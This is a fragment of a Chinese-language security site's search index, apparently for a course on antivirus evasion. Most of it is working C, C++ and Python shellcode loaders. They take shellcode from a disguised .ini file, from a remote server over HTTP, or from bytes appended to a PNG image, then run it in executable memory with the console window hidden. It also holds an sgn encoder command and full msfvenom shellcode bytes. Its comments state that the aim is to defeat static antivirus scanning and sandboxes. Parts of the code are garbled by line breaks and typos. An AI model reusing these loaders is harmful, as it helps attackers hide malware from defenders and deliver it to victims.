-badchars\uff1a\u6307\u5b9a\u4e0d\u4f7f\u7528\u7684\u4e0d\u826f\u5b57\u7b26\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8868\u793a\u3002( \\x00,\\x01) -c\uff1a\u6307\u5b9a\u7f16\u7801\u4e8c\u8fdb\u5236\u7684\u6b21\u6570 ( \u9ed8\u8ba41,1-10 )\uff0c\u589e\u52a0\u603b\u4f53\u5927\u5c0f\u3002 -h\uff1a\u6253\u5370\u5e2e\u52a9\u4fe1\u606f\u3002 -max\uff1a\u6307\u5b9a\u6700\u5927\u6df7\u6dc6\u5b57\u8282\u6570\u3002\uff08\u9ed8\u8ba4\u4e3a20\uff09 -o\uff1a\u6307\u5b9a\u7f16\u7801\u540e\u8f93\u51fa\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u540d\u3002 -plain-decoder\uff1a\u4e0d\u5bf9\u89e3\u7801\u5668\u5b58\u6839\u8fdb\u884c\u7f16\u7801\u3002 -safe\uff1a\u4e0d\u4fee\u6539\u4efb\u4f55\u5bc4\u5b58\u5668\u503c\u3002 -v\uff1a\u63d0\u4f9b\u66f4\u8be6\u7ec6\u7684\u8f93\u51fa\u4fe1\u606f\u3002</p> <p>\u5e38\u7528\u547d\u4ee4</p> <pre><code>sgn -a 64 -c 6 -o pd.bin payload.bin\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#33shellcode","title":"3.3shellcode\u5206\u79bb","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#1_4","title":"1.\u672c\u5730\u76f4\u63a5\u5206\u79bb","text":"<p>\u76f4\u63a5\u5728\u52a0\u8f7d\u5668\u4e2d\u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6 ( \u4e8c\u8fdb\u5236\u6587\u4ef6raw ) \u5185\u5bb9\u7684\u5f62\u5f0f\u83b7\u53d6shellcode, \u7136\u540e\u52a0\u8f7d\u8fd0\u884c</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#c","title":"c\u8bed\u8a00","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97 \u53e3\n#define _CRT_SECURE_NO_WARNINGS // \u89e3\u51b3 fopen_s \u7684\u8b66\u544a\nint main() {\n    // \u8bfb\u53d6shellcode\u6587\u4ef6\n    char filename[] = \"conx.ini\";\n    FILE* file;\n    if (fopen_s(&amp;file, filename, \"rb\") != 0) {\n        perror(\"Failed to open the code file.\");\n        return 1;\n    }\n    fseek(file, 0, SEEK_END);\n    long size = ftell(file);\n    fseek(file, 0, SEEK_SET);\n    char* code = (char*)malloc(size);\n    if (!code) {\n        perror(\"Failed to allocate memory for code.\");\n        fclose(file);\n        return 1;\n    }\n    if (fread(code, 1, size, file) != size) {\n        perror(\"Failed to read code from the file.\");\n        fclose(file);\n        free(code);\n        return 1;\n    }\n    fclose(file);\n    // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n    LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,\n    PAGE_EXECUTE_READWRITE);\n    // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n    if (addr == NULL) {\n        return 1;\n    }\n    // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n    memcpy(addr, code, size);\n    // \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\n    HANDLE hThread = CreateThread(NULL,\n    NULL,\n     (LPTHREAD_START_ROUTINE)addr,\n    NULL,\n    NULL,\n    0);\n    // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n    WaitForSingleObject(hThread, -1);\n    // \u5173\u95ed\u7ebf\u7a0b\n    CloseHandle(hThread);\n    // \u91ca\u653e\u8d44\u6e90\n    free(code);\n    return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#python","title":"Python \u8bed\u8a00","text":"<pre><code>import ctypes\nVirtualAlloc = ctypes.windll.kernel32.VirtualAlloc\nRtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory\nCreateThread = ctypes.windll.kernel32.CreateThread\nWaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject\n# shellcode\u53ef\u4ee5\u7528cs\u6765\u751f\u6210\n# \u8bfb\u53d6\u6587\u4ef6\nwith open(\"config.ini\",mode=\"rb\") as f:\nbuf = f.read()\nsc = bytearray(buf)\nVirtualAlloc.restype = ctypes.c_uint64 # \u91cd\u8f7d\u51fd\u6570\u8fd4\u56de\u7c7b\u578b\u4e3ac_uint64\np = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(sc)), 0x3000, 0x00000040) # \u7533\u8bf7\u5185\u5b58\nbuf = (ctypes.c_char * len(sc)).from_buffer(sc) # \u5c06sc\u6307\u5411\u6307\u9488\nRtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(sc))) # \u590d\u5236sc\u8fdb\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\nh = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0), \nctypes.c_int(0),\nctypes.pointer(ctypes.c_int(0))) # \u6267\u884c\u521b\u5efa\u7ebf\u7a0b\nWaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1)) # \u68c0\u6d4b\u7ebf\u7a0b\u521b\u5efa\u4e8b\u4ef6\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2_3","title":"2.\u5206\u79bb\u5230\u7f51\u7edc","text":"<p>\u8ddf\u672c\u5730\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u9700\u8981\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42, \u7136\u540e\u83b7\u53d6shellcode\u7684\u5185\u5bb9 ( 16\u8fdb\u5236\u5b57\u7b26\u4e32\\xfc, \u4e0d\u662fbin\u6587\u4ef6 )</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#c_1","title":"c++","text":"<pre><code>#include &lt;string&gt;\n#include &lt;windows.h&gt;\n#include &lt;winhttp.h&gt;\n#include &lt;iostream&gt;\n#pragma comment(lib, \"winhttp.lib\")\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97 \u53e3\nusing namespace std;\nchar* WinGet(char* ip, int port, char* path)\n{\n  HINTERNET hSession = NULL;\n  HINTERNET hConnect = NULL;\n  HINTERNET hRequest = NULL;\n  //************ \u5c06char\u8f6c\u6362\u4e3awchar_t *****************/\n  int ipSize;\n  wchar_t* ip_wchar;\n  //\u8fd4\u56de\u63a5\u53d7\u5b57\u7b26\u4e32\u6240\u9700\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff0c\u5df2\u7ecf\u5305\u542b\u5b57\u7b26\u7ed3\u5c3e\u7b26'\\0'\n  ipSize = MultiByteToWideChar(CP_ACP, 0, ip, -1, NULL, 0); //iSize\n  = wcslen(pwsUnicode) + 1 = 6\n    ip_wchar = (wchar_t*)malloc(ipSize * sizeof(wchar_t)); //\u4e0d\u9700\u8981 pwszUnicode = (wchar_t\n  *)malloc((iSize + 1) * sizeof(wchar_t))\n    MultiByteToWideChar(CP_ACP, 0, ip, -1, ip_wchar, ipSize);\n  int urlSize;\n  wchar_t* url_wchar;\n  //\u8fd4\u56de\u63a5\u53d7\u5b57\u7b26\u4e32\u6240\u9700\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff0c\u5df2\u7ecf\u5305\u542b\u5b57\u7b26\u7ed3\u5c3e\u7b26'\\0'\n  urlSize = MultiByteToWideChar(CP_ACP, 0, path, -1, NULL, 0); //iSize\n  = wcslen(pwsUnicode) + 1 = 6\n    url_wchar = (wchar_t*)malloc(urlSize * sizeof(wchar_t)); //\u4e0d\u9700\u8981 pwszUnicode = (wchar_t\n  *)malloc((iSize + 1) * sizeof(wchar_t))\n    MultiByteToWideChar(CP_ACP, 0, path, -1, url_wchar, urlSize);\n  //************ ********************************* *****************/\n  //port = 80; //\u9ed8\u8ba4\u7aef\u53e3\n  //1. \u521d\u59cb\u5316\u4e00\u4e2aWinHTTP-session\u53e5\u67c4\uff0c\u53c2\u65701\u4e3a\u6b64\u53e5\u67c4\u7684\u540d\u79f0\n  hSession = WinHttpOpen(L\"WinHTTP Example/1.0\",\n    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,\n    WINHTTP_NO_PROXY_NAME,\n    WINHTTP_NO_PROXY_BYPASS, 0);\n  if (hSession == NULL) {\n    cout &lt;&lt; \"Error:Open session failed: \" &lt;&lt; GetLastError() &lt;&lt; endl;\n    exit(0);\n  }\n  //2. \u901a\u8fc7\u4e0a\u8ff0\u53e5\u67c4\u8fde\u63a5\u5230\u670d\u52a1\u5668\uff0c\u9700\u8981\u6307\u5b9a\u670d\u52a1\u5668IP\u548c\u7aef\u53e3\u53f7\nINTERNET_DEFAULT_HTTP_PORT:80\u3002\u82e5\u8fde\u63a5\u6210\u529f\uff0c\u8fd4\u56de\u7684hConnect\u53e5\u67c4\u4e0d\u4e3aNULL\nhConnect = WinHttpConnect(hSession, ip_wchar, port, 0);\nif (hConnect == NULL) {\n  cout &lt;&lt; \"Error:Connect failed: \" &lt;&lt; GetLastError() &lt;&lt; endl;\n  exit(0);\n}\n//3. \u901a\u8fc7hConnect\u53e5\u67c4\u521b\u5efa\u4e00\u4e2ahRequest\u53e5\u67c4\uff0c\u7528\u4e8e\u53d1\u9001\u6570\u636e\u4e0e\u8bfb\u53d6\u4ece\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u3002\nhRequest = WinHttpOpenRequest(hConnect, L\"GET\", url_wchar, NULL,\n  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);\n//\u5176\u4e2d\u53c2\u65702\u8868\u793a\u8bf7\u6c42\u65b9\u5f0f\uff0c\u6b64\u5904\u4e3aGet\uff1b\u53c2\u65703:\u7ed9\u5b9aGet\u7684\u5177\u4f53\u5730\u5740\uff0c\u5982\u8fd9\u91cc\u7684\u5177\u4f53\u5730\u5740\u4e3a\nhttps://www.citext.cn/GetTime.php\nif (hRequest == NULL) {\n  cout &lt;&lt; \"Error:OpenRequest failed: \" &lt;&lt; GetLastError() &lt;&lt; endl;\n  exit(0);\n}\nBOOL bResults;\n//\u53d1\u9001\u8bf7\u6c42\nbResults = WinHttpSendRequest(hRequest,\n  WINHTTP_NO_ADDITIONAL_HEADERS,\n  0, WINHTTP_NO_REQUEST_DATA, 0,\n  0, 0);\nif (!bResults) {\n  cout &lt;&lt; \"Error:SendRequest failed: \" &lt;&lt; GetLastError() &lt;&lt; endl;\n  exit(0);\n}\nelse {\n  //\uff083\uff09 \u53d1\u9001\u8bf7\u6c42\u6210\u529f\u5219\u51c6\u5907\u63a5\u53d7\u670d\u52a1\u5668\u7684response\u3002\u6ce8\u610f\uff1a\u5728\u4f7f\u7528\n  WinHttpQueryDataAvailable\u548cWinHttpReadData\u524d\u5fc5\u987b\u4f7f\u7528WinHttpReceiveResponse\u624d\u80fd\n    access\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\n    bResults = WinHttpReceiveResponse(hRequest, NULL);\n}\nLPVOID lpHeaderBuffer = NULL;\nDWORD dwSize = 0;\n//4-3. \u83b7\u53d6\u670d\u52a1\u5668\u8fd4\u56de\u6570\u636e\nLPSTR pszOutBuffer = NULL;\nDWORD dwDownloaded = 0; //\u5b9e\u9645\u6536\u53d6\u7684\u5b57\u7b26\u6570\nwchar_t* pwText = NULL;\nif (bResults)\n{\n  do\n  {\n    //(1) \u83b7\u53d6\u8fd4\u56de\u6570\u636e\u7684\u5927\u5c0f\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\n    dwSize = 0;\n    if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize)) {\n      cout &lt;&lt; \"Error\uff1aWinHttpQueryDataAvailable failed\uff1a\" &lt;&lt; GetLastError() &lt;&lt; endl;\n      break;\n    }\n    if (!dwSize) break; //\u6570\u636e\u5927\u5c0f\u4e3a0\n    //(2) \u6839\u636e\u8fd4\u56de\u6570\u636e\u7684\u957f\u5ea6\u4e3abuffer\u7533\u8bf7\u5185\u5b58\u7a7a\u95f4\n    pszOutBuffer = new char[dwSize + 1];\n    if (!pszOutBuffer) {\n      cout &lt;&lt; \"Out of memory.\" &lt;&lt; endl;\n      break;\n    }\n    ZeroMemory(pszOutBuffer, dwSize + 1); //\u5c06buffer\u7f6e0\n    //(3) \u901a\u8fc7WinHttpReadData\u8bfb\u53d6\u670d\u52a1\u5668\u7684\u8fd4\u56de\u6570\u636e\n    if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &amp;dwDownloaded)) {\n      cout &lt;&lt; \"Error\uff1aWinHttpQueryDataAvailable failed\uff1a\" &lt;&lt; GetLastError() &lt;&lt; endl;\n    }\n    if (!dwDownloaded)\n      break;\n  } while (dwSize &gt; 0);\n  //4-4. \u5c06\u8fd4\u56de\u6570\u636e\u8f6c\u6362\u6210UTF8\n  DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0); //\u8fd4\u56de\u539f\u59cbASCII\u7801\u7684\u5b57\u7b26\u6570\u76ee\n  pwText = new wchar_t[dwNum]; //\u6839\u636eASCII\u7801\u7684\u5b57\u7b26\u6570\u5206\u914dUTF8\u7684\u7a7a\u95f4\n  MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum); //\u5c06ASCII\u7801\u8f6c\u6362\u6210UTF8\n  //printf(\"\\n\u8fd4\u56de\u6570\u636e\u4e3a:\\n%S\\n\\n\", pwText);\n}\n//5. \u4f9d\u6b21\u5173\u95edrequest\uff0cconnect\uff0csession\u53e5\u67c4\nif (hRequest) WinHttpCloseHandle(hRequest);\nif (hConnect) WinHttpCloseHandle(hConnect);\nif (hSession) WinHttpCloseHandle(hSession);\n/****************** \u5c06wchar\u8f6c\u6362\u4e3achar *******************/\nint iSize;\nchar* data;\n//\u8fd4\u56de\u63a5\u53d7\u5b57\u7b26\u4e32\u6240\u9700\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff0c\u5df2\u7ecf\u5305\u542b\u5b57\u7b26\u7ed3\u5c3e\u7b26'\\0'\niSize = WideCharToMultiByte(CP_ACP, 0, pwText, -1, NULL, 0, NULL, NULL); //iSize\n= wcslen(pwsUnicode) + 1 = 6\ndata = (char*)malloc(iSize * sizeof(char)); //\u4e0d\u9700\u8981 pszMultiByte =\n(char*)malloc(iSize * sizeof(char) + 1);\nWideCharToMultiByte(CP_ACP, 0, pwText, -1, data, iSize, NULL, NULL);\nreturn data;\n}\nint chartoint(char ch)\n{\n  //0xff 0=9 a-f A-F\n  //'5' = 65 '0'=60 65-60=5\n  if (ch &gt;= '0' &amp;&amp; ch &lt;= '9')\n  {\n    return ch - '0';\n  }\n  else if (ch &gt;= 'a' &amp;&amp; ch &lt;= 'f')\n  {\n    return ch - 'a' + 10;\n  }\n  else if (ch &gt;= 'A' &amp;&amp; ch &lt;= 'F')\n  {\n    return ch - 'A' + 10;\n  }\n}\nvoid stringtoint(char* string, char* ary)\n{\n  int hex = 0;\n  for (size_t i = 0; i &lt; strlen(string); i++)\n  {\n    if (string[i] == 'x')\n    {\n      int ff = string[i + 1];\n      ary[hex] = chartoint(string[i + 1]) * 16 + chartoint(string[i + 2]);\n      hex += 1;\n      i = i + 2;\n    }\n  }\n}\nint main()\n{\n  char* data;\n  char ip[] = \"vpsip\";\n  char path[] = \"config.ini\";\n  data = WinGet(ip, 8000, path);\n  //cout &lt;&lt; \"\u8fd4\u56de\u7684\u6570\u636e\u4e3a: \" &lt;&lt; data &lt;&lt; endl;\n  // \u5b57\u7b26\u4e32\u683c\u5f0f\u7684shellcode\u8f6c\u6210\u5b57\u7b26\u6570\u7ec4\n  char ary[1000] = { 0 };\n  stringtoint(data, ary); // ary\u5b57\u7b26\u6570\u7ec4 , \u539fshellcode\n  int size = sizeof(ary);\n  // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n  LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,\n    PAGE_EXECUTE_READWRITE);\n  // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n  if (addr == NULL) {\n    return 1;\n  }\n  // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n  memcpy(addr, ary, size);\n  // \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\n  HANDLE hThread = CreateThread(NULL,\n    NULL,\n    (LPTHREAD_START_ROUTINE)addr,\n    NULL,\n    NULL,\n    0);\n  // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n  WaitForSingleObject(hThread, -1);\n  // \u5173\u95ed\u7ebf\u7a0b\n  CloseHandle(hThread);\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#python_1","title":"Python","text":"<pre><code>import ctypes\nimport requests\nVirtualAlloc = ctypes.windll.kernel32.VirtualAlloc\nRtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory\nCreateThread = ctypes.windll.kernel32.CreateThread\nWaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject\n# shellcode\u53ef\u4ee5\u7528cs\u6765\u751f\u6210\n# \u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\nresponse = requests.get(\"http://127.0.0.1:8000/config.ini\")\nbuf = response.text\n# \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5b57\u8282\u5bf9\u8c61\nbuf = bytes.fromhex(buf.replace(\"\\\\x\", \"\"))\nsc = bytearray(buf)\nVirtualAlloc.restype = ctypes.c_uint64 # \u91cd\u8f7d\u51fd\u6570\u8fd4\u56de\u7c7b\u578b\u4e3ac_uint64\np = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(sc)), 0x3000, 0x00000040) # \u7533\u8bf7\u5185\u5b58\nbuf = (ctypes.c_char * len(sc)).from_buffer(sc) # \u5c06sc\u6307\u5411\u6307\u9488\nRtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(sc))) # \u590d\u5236sc\u8fdb\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\nh = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0), \nctypes.c_int(0),\nctypes.pointer(ctypes.c_int(0))) # \u6267\u884c\u521b\u5efa\u7ebf\u7a0b\nWaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1)) # \u68c0\u6d4b\u7ebf\u7a0b\u521b\u5efa\u4e8b\u4ef6\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#3_2","title":"3.\u9690\u85cf\u5728\u56fe\u7247\u4e2d","text":"<p>\u539f\u7406\u5f88\u7b80\u5355, \u76f8\u5bf9\u4e8e\u672c\u5730\u76f4\u63a5\u5206\u79bb\u6709\u4e86\u56fe\u7247\u4f5c\u4e3a\u4f2a\u88c5, \u514d\u6740\u6548\u679c\u597d\u4e00\u70b9\u70b9 \u5236\u4f5c\u6b65\u9aa4 1.\u9009\u53d6\u4e00\u5f20\u56fe\u7247, \u7136\u540e\u8bfb\u53d6\u56fe\u7247\u7684\u5b57\u8282\u5927\u5c0f 2.\u5728\u56fe\u7247\u672b\u5c3e\u63d2\u5165shellcode 3.\u751f\u6210\u4e00\u5f20\u65b0\u7684\u56fe\u7247, \u4e14\u8bb0\u5f55shellcode\u7684\u5728\u6587\u4ef6\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e 4.\u6253\u5f00\u56fe\u7247\u6587\u4ef6,\u4eceshellcode\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u8bfb\u53d6 5.\u6b63\u5e38\u52a0\u8f7d\u6267\u884c shellcode\u63d2\u5165\u56fe\u7247\u6587\u4ef6</p> <pre><code>def main(shell_code, file_name=\"tom.png\"):\n# \u6253\u5f00tom.png\n    with open(file_name, mode=\"rb\") as f:\n        data = f.read()\n        print(\"shell_code \u8d77\u59cb\u4f4d\u7f6e\u4e3a:\", len(data))\n        with open(\"tom_new.png\", mode=\"wb\") as f:\n            f.write(data+shell_code)\n        print(\"shell_code \u63d2\u5165\u6210\u529f\")\n\nif __name__ == '__main__':\n    data = b\"\\xfc\u4f60\u7684shellcode\"\n    main(data)\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#python_2","title":"python","text":"<pre><code>import ctypes\ndef main():\n# \u8bfb\u53d6\u56fe\u7247\u83b7\u53d6\n    with open(\"tom_new.png\", mode=\"rb\") as f:\n    # \u79fb\u52a8\u5230shellcode\u8d77\u59cb\u4f4d\u7f6e\n        f.seek(1101128)\n        content = f.read()\n    bdata = bytearray(content)\n    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 # \u91cd\u8f7d\u51fd\u6570\u8fd4\u56de\u7c7b\u578b\u4e3ac_uint64\n    p = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), 0x3000, \n    0x00000040) # \u7533\u8bf7\u5185\u5b58\n    data = (ctypes.c_char * len(bdata)).from_buffer(bdata) # \u5c06bdata\u6307\u5411\u6307\u9488\n    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(p), data, ctypes.c_int(len(bdata))) # \u590d\u5236shellcode\u8fdb\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\n    h = ctypes.windll.kernel32.CreateThread(ctypes.c_iQnt(0),\n                 ctypes.c_int(0),\n                    ctypes.c_void_p(p),\n                    ctypes.c_int(0),\n                    ctypes.c_int(0),\n                    ctypes.pointer(ctypes.c_int(0))\n                    ) # \u6267\u884c\u521b\u5efa\u7ebf\u7a0b\n    # \u68c0\u6d4b\u7ebf\u7a0b\u521b\u5efa\u4e8b\u4ef6\n    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1))\n\n    if __name__ == '__main__':\n        main()\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#c_2","title":"c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;Windows.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\u53e3\n\nint main() {\n    FILE* file = fopen(\"tom_new.png\", \"rb\");\n    if (!file) {\n        perror(\"Error opening file\");\n        return 1;\n    }\n\n    // \u79fb\u52a8\u5230 shellcode \u8d77\u59cb\u4f4d\u7f6e\n    fseek(file, 7533, SEEK_SET);\n\n    // \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f\n    fseek(file, 0, SEEK_END);\n    long size = ftell(file);\n    fseek(file, 7533, SEEK_SET);  // \u91cd\u65b0\u8bbe\u7f6e\u6587\u4ef6\u6307\u9488\u5230\u8d77\u59cb\u4f4d\u7f6e\n\n    // \u8bfb\u53d6\u5185\u5bb9\n    char* content = (char*)malloc(size);\n    if (!content) {\n        perror(\"Error allocating memory\");\n        fclose(file);\n        return 1;\n    }\n\n    fread(content, 1, size, file);\n    fclose(file);\n\n    // \u7533\u8bf7\u5185\u5b58\n    LPVOID p = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (p == NULL) {\n        DWORD error = GetLastError();\n        fprintf(stderr, \"Error allocating memory. GetLastError: %lu\\n\", error);\n        free(content);\n        return 1;\n    }\n\n    // \u590d\u5236 shellcode \u8fdb\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\n    memcpy(p, content, size);\n\n    // \u521b\u5efa\u7ebf\u7a0b\n    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);\n    if (h == NULL) {\n        fprintf(stderr, \"Error creating thread\\n\");\n        free(content);\n        return 1;\n    }\n\n    // \u7b49\u5f85\u7ebf\u7a0b\u5b8c\u6210\n    WaitForSingleObject(h, INFINITE);\n\n    // \u91ca\u653e\u5185\u5b58\n    VirtualFree(p, 0, MEM_RELEASE);\n    free(content);\n    return 0;\n}\n</code></pre> <p>shellcode\u52a0\u5bc6/\u7f16\u7801\u90fd\u662f\u4e3a\u4e86\u9003\u8fc7\u6740\u8f6f\u7684\u9759\u6001\u68c0\u6d4b, \u5206\u79bb\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u4e5f\u6709\u5bf9\u6297\u4e91\u6c99\u7bb1\u7684\u4f5c\u7528, \u56e0\u4e3a\u6c99\u7bb1\u4e2d\u6ca1\u6709shellcode\u6587\u4ef6, \u65e0\u6cd5\u52a0\u8f7d</p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html","title":"1.shellcode","text":"<p>\u672cshellcode\u529f\u80fd\u4e3a\u8fd0\u884c\u8ba1\u7b97\u673a</p> <pre><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c &gt; shellcode.c\n\nunsigned char buf[] = \n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#2","title":"2.\u6307\u9488\u8fd0\u884c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#21","title":"2.1 \u7533\u8bf7\u5185\u5b58","text":""},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_1","title":"\u7f51\u4f20\u7248\u672c","text":"<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nunsigned char sc[] 